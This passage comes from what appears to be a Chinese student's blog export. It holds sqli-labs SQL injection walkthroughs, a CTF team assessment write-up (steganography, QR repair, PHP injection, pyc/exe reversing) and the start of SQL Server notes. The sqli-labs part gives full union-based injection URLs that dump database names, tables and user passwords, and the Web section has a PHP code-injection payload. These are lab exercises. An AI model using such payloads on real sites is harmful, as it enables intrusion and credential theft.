src="https://img-blog.csdnimg.cn/2020101516584326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>4.进行数值型注入判断，页面异常，说明此处存在数值型注入<br><img src="https://img-blog.csdnimg.cn/20201015170226176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201015170250722.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>5.order by查询字节，得出有3个字节<br><img src="https://img-blog.csdnimg.cn/20201015171009564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/2020101517093379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>6.union select 查询注入点<img src="https://img-blog.csdnimg.cn/20201015181015933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>7.查数据库名</p><pre><code>http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,(select%20group_concat(schema_name)from%20information_schema.schemata),3--+</code></pre><p><img src="https://img-blog.csdnimg.cn/20201015181158577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>8.查询表名</p><pre><code>http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=%27security%27),3--+</code></pre><p><img src="https://img-blog.csdnimg.cn/2020101518275368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"></p><p>9.查询列名</p><pre><code>http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_name=%27users%27),3--+</code></pre><p><img src="https://img-blog.csdnimg.cn/20201015184332741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>10.查询列中的数据</p><pre><code>http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,(select%20group_concat(password)from%20security.users),3--+</code></pre><p><img src="https://img-blog.csdnimg.cn/20201015190108996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"></p><pre><code>http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,(select%20group_concat(username)from%20security.users),3--+</code></pre><p><img src="https://img-blog.csdnimg.cn/20201015190653773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"></p><h1 id="sqli-labs-less-3"><a href="#sqli-labs-less-3" class="headerlink" title="sqli-labs less-3"></a><strong>sqli-labs less-3</strong></h1><p>1.判断注入类型为字符型注入。闭合形式为’)<br>(听说是根据源码判断出来的)</p><p><img src="https://img-blog.csdnimg.cn/20201015195631368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>其余步骤请参考前两关</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web,CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>战队第二次考核wp</title>
      <link href="posts/942f.html"/>
      <url>posts/942f.html</url>
      
        <content type="html"><![CDATA[<p>本帖为记录长右网络空间安全战队第二次考核题内容，希望可以记住自己做过的题，让自己更好地进步。</p><h1 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h1><p>签到题，直接提交flag即可。<br><img src="https://img-blog.csdnimg.cn/20200407093045750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="1-小熊猫变成小兔叽"><a href="#1-小熊猫变成小兔叽" class="headerlink" title="1.小熊猫变成小兔叽"></a>1.小熊猫变成小兔叽</h2><p><img src="https://img-blog.csdnimg.cn/20200407093651474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>附件为一个名为zip的文件，没有后缀，在文件名后加上.zip（压缩文件的后缀名），文件变为压缩文件。打开压缩文件，发现一张图。<br><img src="https://img-blog.csdnimg.cn/20200407094149676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>根据题目中“小熊猫拉长一下”，猜测需要改变图片的高度或者宽度。鼠标右键查看图片属性：<br><img src="https://img-blog.csdnimg.cn/20200407094437394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>发现图片高度比较低，于是考虑增加图片的高度。这里用到的工具为WinHex。<br>具体操作方法请参考<a href="https://blog.csdn.net/CliffordR/article/details/81123232?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158605320819725219953422%2522%252C%2522scm%2522%253A%252220140713.130056874..%2522%257D&amp;request_id=158605320819725219953422&amp;biz_id=0&amp;utm_source=distribute.pc_search_result.none-task-blog-blog_SOOPENSEARCH-2">CTF 图片隐写之修改图片高宽</a><br>简单来说该图片的高度为380像素，于是将380转换成十六进制，为017c,然后在WinHex找到017c，将其改为我们想要改正的数值的十六进制形式。<br>我在具体操作中将改图片的高度改为420像素（十六进制形式为01a4），成功得到图片下方的字符串：<br><img src="https://img-blog.csdnimg.cn/20200407095908462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>字符串为：olee{qlr3y_16q51_y3q1l_rc654_yap45}<br>参考题目中给出的flag形式，发现这串字符形式已经和flag的形式一样了。提示给出“低头看看键盘”，于是去搜和键盘相关的解码，发现键盘密码(键盘上的字母顺序分别对应字母表里的字母顺序，如QWE对应ABC)，OLEE正好对应了ISCC,于是使用键盘密码的方式，得到最后的flag.</p><blockquote><p>iscc{asd3f_16a51_f3a1s_dv654_fkj45}</p></blockquote><h2 id="2-Broken-WUHAN"><a href="#2-Broken-WUHAN" class="headerlink" title="2.Broken WUHAN"></a>2.Broken WUHAN</h2><p><img src="https://img-blog.csdnimg.cn/2020040710434112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>下载附件，为一个不可读的图片。使用WinHex打开图片，<br><img src="https://img-blog.csdnimg.cn/20200407105209321.png"><br>发现图片的文件头标志不对(.jpg文件的头标志应该为FFD8FF)，于是修改头标志，<br><img src="https://img-blog.csdnimg.cn/20200407110509484.png"><br>保存，成功打开图片，得到flag.<br><img src="https://img-blog.csdnimg.cn/20200407110717302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>有关文件的头标志，请参考：<a href="https://blog.csdn.net/holandstone/article/details/7624343">各类文件的文件头标志</a></p><blockquote><p>flag{wu_Han_jia_Y0u!}</p></blockquote><h2 id="3-QRQRQRQRQRQRQRQRQRQRQRQRQR"><a href="#3-QRQRQRQRQRQRQRQRQRQRQRQRQR" class="headerlink" title="3. QRQRQRQRQRQRQRQRQRQRQRQRQR"></a>3. QRQRQRQRQRQRQRQRQRQRQRQRQR</h2><p><img src="https://img-blog.csdnimg.cn/20200407110930582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>下载附件，是一张二维码的动态图<br><img src="https://img-blog.csdnimg.cn/20200407111133130.gif"><br>既然是动态图，那么肯定要逐一查看每一帧，找出最特殊的一帧。可以使用ps打开动态图，进行逐一查看，但是有100帧，这样有些费事。我这里使用一个软件Namo GIF编辑器，比较方便：<br><img src="https://img-blog.csdnimg.cn/20200407111915475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>于是取出第62帧，<br><img src="https://img-blog.csdnimg.cn/20200407112418932.png"><br>第62帧与其他二维码最大的不同之处就是多了右下角的小方框。对比一般二维码，这张二维码少了三个定位符，于是用ps给这图加上定位符<br><img src="https://img-blog.csdnimg.cn/20200407112443253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>用微信或者支付宝扫一扫，得到flag.(扫不出来请多扫扫，图片还原度不高会导致识别率较低)<br><img src="https://img-blog.csdnimg.cn/20200407112800922.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"></p><blockquote><p>flag{GYSEC_GOGOGO}</p></blockquote><h2 id="4-来玩拼图呀"><a href="#4-来玩拼图呀" class="headerlink" title="4.来玩拼图呀"></a>4.来玩拼图呀</h2><p><img src="https://img-blog.csdnimg.cn/20200407200219412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>附送的音乐为：Time,挺好听的。一开始是真的没想到这首歌的意思。附件就是二百多张拼图，而且顺序是乱的，真要拼出来花儿都谢了。其实Time的真正意思是让图片按照时间排序，就可以得到按顺序的图片了，再用ps进行拼图，就很容易了。<br><img src="https://img-blog.csdnimg.cn/20200407200821115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"></p><blockquote><p>flag{fate_stay_nt}</p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-var-dump"><a href="#1-var-dump" class="headerlink" title="1.var_dump("></a>1.var_dump(</h2><p><img src="https://img-blog.csdnimg.cn/20200407201829517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>打开网页，是一些代码：<br><img src="https://img-blog.csdnimg.cn/20200407201906579.png"></p><p>虽然不是很懂，于是直接去查题目，得到：var_dump() 函数用于输出变量的相关信息。然后再去查$_REQUEST: 可以获取以POST方法和GET方法提交的数据，在参考众多网站之后，得到在网址后加上index.php?hello=1);print_r(file(“./flag.php”)，访问网址，即可得到flag.<br><img src="https://img-blog.csdnimg.cn/20200407204339657.png"><br><a href="https://segmentfault.com/a/1190000016750234">参考文章</a></p><blockquote><p>flag{your_php_is_very_good_my_bro}</p></blockquote><h2 id="2-Easy-Challenge"><a href="#2-Easy-Challenge" class="headerlink" title="2.Easy_Challenge"></a>2.Easy_Challenge</h2><p><img src="https://img-blog.csdnimg.cn/20200407213149622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>都说了是一道老题了，那就直接上链接吧：<a href="https://blog.csdn.net/qin9800/article/details/105299457/">我是原题</a></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="1-Simple-py"><a href="#1-Simple-py" class="headerlink" title="1.Simple_py"></a>1.Simple_py</h2><p><img src="https://img-blog.csdnimg.cn/2020040809093315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br>这是一道python逆向题，附件为一个.pyc文件，因此需要找到将.pyc文件还原为.py文件的方法。具体方法参考链接：<a href="https://blog.csdn.net/qq_37245397/article/details/103260014">python反编译exe</a><br>这篇文章介绍的是把.exe文件先变成.pyc文件再还原成.py文件的方法，在这个题中我们只需要执行.pyc还原.py就够了。</p><pre><code>// 这是还原后的.py代码：</code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// import base64</span>def <span class="token function">encode</span><span class="token punctuation">(</span>mess<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> mess<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16</span>        x <span class="token operator">=</span> x <span class="token operator">^</span> <span class="token number">32</span>        s <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span><span class="token function">b64encode</span><span class="token punctuation">(</span><span class="token function">bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>correct <span class="token operator">=</span> b<span class="token string">'VlxRV8KreGFCYU9ZwqNPwqDCqVNPQlVPdmFRV8Kt'</span>flag <span class="token operator">=</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'input flag:'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token function">encode</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> correct<span class="token punctuation">:</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'you are correct'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'you are wrong'</span><span class="token punctuation">)</span></code></pre><p>其中，核心代码只有中间一部分：</p><pre><code>// 核心代码</code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//     for i in mess:</span>        x <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16</span>        x <span class="token operator">=</span> x <span class="token operator">^</span> <span class="token number">32</span>        s <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></code></pre><p>想要得到flag,我们就要将程序反过来写，通过反向运行程序，获得原来的flag，因此，改变核心代码，得到：</p><pre><code>// 修改后的代码</code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// import base64</span>mess<span class="token operator">=</span><span class="token string">'VlxRV8KreGFCYU9ZwqNPwqDCqVNPQlVPdmFRV8Kt'</span>s <span class="token operator">=</span> <span class="token string">''</span>mess <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b64decode</span><span class="token punctuation">(</span>mess<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> mess<span class="token punctuation">:</span>    x <span class="token operator">=</span> i <span class="token operator">^</span> <span class="token number">32</span>    x <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">16</span>    s <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></code></pre><p>运行后得到：</p><blockquote><p>flagÒ{H1R1_iÒs_ÒpÒyc_Re_F1agÒ}</p></blockquote><p>将其中明显不是密码的Ò去掉，得到最后的flag:</p><blockquote><p>flag{H1R1_is_pyc_Re_F1ag}</p></blockquote><h2 id="2-Easy-Reverse"><a href="#2-Easy-Reverse" class="headerlink" title="2.Easy Reverse"></a>2.Easy Reverse</h2><p><img src="https://img-blog.csdnimg.cn/20200408093250543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载附件，是一个.exe文件，因为不是python文件，因此我们不能用上一题一样的方法去还原其代码了。于是考虑其他的反编译器，这里使用IDA进行反编译，得到C伪代码</p><pre><code>// 伪C代码</code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// #include &lt;stdio.h></span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    int a<span class="token punctuation">;</span>    char v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+16h] [ebp-1Ah]</span>    char v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+17h] [ebp-19h]</span>    char v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-18h]</span>    char v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+19h] [ebp-17h]</span>    char v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ah] [ebp-16h]</span>    char v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Bh] [ebp-15h]</span>    char v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-14h]</span>    char v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Dh] [ebp-13h]</span>    char v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Eh] [ebp-12h]</span>    char v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Fh] [ebp-11h]</span>    char v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-10h]</span>    char v15<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+21h] [ebp-Fh]</span>    char v16<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+22h] [ebp-Eh]</span>    char v17<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+23h] [ebp-Dh]</span>    char v18<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-Ch]</span>    char v19<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+25h] [ebp-Bh]</span>    char v20<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+26h] [ebp-Ah]</span>    char v21<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+27h] [ebp-9h]</span>    int v22<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-8h]</span>    int i<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入数字:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v22<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        v4 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">125</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> <span class="token number">124</span><span class="token punctuation">;</span>        v6 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">122</span><span class="token punctuation">;</span>        v7 <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>        v8 <span class="token operator">=</span> <span class="token number">106</span><span class="token punctuation">;</span>        v9 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">113</span><span class="token punctuation">;</span>        v10 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">109</span><span class="token punctuation">;</span>        v11 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">118</span><span class="token punctuation">;</span>        v12 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">126</span><span class="token punctuation">;</span>        v13 <span class="token operator">=</span> <span class="token number">119</span><span class="token punctuation">;</span>        v14 <span class="token operator">=</span> <span class="token number">108</span><span class="token punctuation">;</span>        v15 <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>        v16 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">122</span><span class="token punctuation">;</span>        v17 <span class="token operator">=</span> <span class="token number">116</span><span class="token punctuation">;</span>        v18 <span class="token operator">=</span> <span class="token number">122</span><span class="token punctuation">;</span>        v19 <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">;</span>        v20 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">102</span><span class="token punctuation">;</span>        v21 <span class="token operator">=</span> <span class="token number">91</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">17</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">putchar</span><span class="token punctuation">(</span>v22 <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入数字:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>flag 第一个字母位“f” asII 码为0x66 ,十进制 102.也就是<br>x-(-125)=102,x=-23<br>于是编写代码：<br>下面展示一些 <code>内联代码片</code>。</p><pre><code>//编写出生成flag的代码</code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// #include &lt;stdio.h></span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               int i<span class="token punctuation">;</span>        int s<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">126</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">17</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">23</span><span class="token operator">-</span> <span class="token punctuation">(</span>s【i】<span class="token punctuation">)</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>运行，生成flag:</p><blockquote><p>flag{UPX_is_What?}</p></blockquote><p>参考网站：<a href="https://www.52pojie.cn/thread-655233-1-1.html">一个简单的ctf逆向</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库操纵语言笔记</title>
      <link href="posts/4981.html"/>
      <url>posts/4981.html</url>
      
        <content type="html"><![CDATA[<p> 刚在数据库课上学了数据库操作语言，对于英语不好的我来说又要记不少单词，趁着这次作业，把刚学的一些语法记一下<br> 注：<br>1.文中路径和文件名请自行替换<br> 2.报错大多是因为一些细微之差，比如冒号引号的缺失，请多多注意</p><h1 id="一-新建数据库"><a href="#一-新建数据库" class="headerlink" title="一.新建数据库"></a>一.新建数据库</h1><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> test1 <span class="token comment" spellcheck="true">#新建数据的名字为test1</span><span class="token keyword">ON</span>     <span class="token comment" spellcheck="true">#以下是指定数据库文件和文件组属性</span><span class="token keyword">PRIMARY</span>  <span class="token comment" spellcheck="true">#主文件组文件属性</span><span class="token punctuation">(</span>    NAME<span class="token operator">=</span><span class="token string">'test1_dat1'</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">#文件名</span>    FILENAME<span class="token operator">=</span><span class="token string">'E:\sql lianxi\test1.mdf'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">#文件路径,最后文件格式为.mdf</span>    SIZE<span class="token operator">=</span>20MB<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">#文件初始大小</span>    MAXSIZE<span class="token operator">=</span>60MB<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">#文件最大大小，不限制则填UNLIMITED</span>    FILEGROWTH<span class="token operator">=</span>5MB     <span class="token comment" spellcheck="true">#文件的增长增量</span><span class="token punctuation">)</span><span class="token punctuation">,</span>FILEGROUP test1_Group1    <span class="token comment" spellcheck="true">#其他文件组名</span><span class="token punctuation">(</span>   NAME <span class="token operator">=</span> <span class="token string">'test1_dat2'</span><span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">#文件名</span>   FILENAME <span class="token operator">=</span> <span class="token string">'E:\sql lianxi\test1.ndf'</span><span class="token punctuation">,</span>     <span class="token comment" 